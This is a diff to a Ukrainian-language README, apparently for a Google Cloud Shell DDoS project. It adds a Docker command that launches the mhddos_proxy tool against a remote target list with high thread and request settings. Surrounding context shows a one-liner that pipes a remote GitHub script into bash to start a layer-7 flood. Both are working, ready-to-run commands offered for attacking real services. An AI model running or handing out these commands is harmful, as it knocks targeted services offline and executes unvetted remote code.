@@ -26,6 +26,10 @@ curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos
 ```
 curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m-proxy_only.sh | bash
 ```
+:white_check_mark:**Команда для встановлення та запуску mhddos_proxy** (*Docker*):
+```
+sudo docker run -it --rm  --cpus="0.75" --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7.lst -t 1000 --vpn 5 --rpc 500
+```
 #
 ### Тести/допрацювання/експерименти. 
 **Нестабільні сеанси, перериваються** (потрібно часто перевіряти)      
